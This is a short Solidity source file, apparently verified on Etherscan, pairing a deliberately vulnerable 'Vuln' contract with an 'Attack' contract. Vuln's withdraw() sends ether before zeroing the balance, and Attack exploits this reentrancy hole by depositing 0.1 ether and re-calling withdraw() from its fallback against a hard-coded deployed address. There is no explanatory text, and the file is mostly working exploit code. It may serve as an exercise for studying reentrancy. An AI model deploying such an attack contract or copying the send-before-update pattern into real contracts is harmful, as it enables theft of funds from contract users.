/**
 *Submitted for verification at Etherscan.io on 2021-12-01
*/

pragma solidity ^0.6.0;

contract Vuln {
    mapping(address => uint256) public balances;

    function deposit() public payable {
        // Increment their balance with whatever they pay
        balances[msg.sender] += msg.value;
    }

    function withdraw() public {
        // Refund their balance
        msg.sender.call.value(balances[msg.sender])("");

        // Set their balance to 0
        balances[msg.sender] = 0;
    }
}

contract Attack {
    
    int x = 2;
    Vuln public vuln=Vuln(address(0x36A540E3A78084962B75E25877CfACf8846Be018));
    fallback() external payable 
    {
        x = x - 1;
        if (x > 0) {
            vuln.withdraw();
        }
    }
    function attack() public payable 
    {
        
        vuln.deposit.value(0.1 ether)();
        vuln.withdraw();
    }
    function getBalance() public view returns (uint) 
    {
        return address(this).balance;
    }
}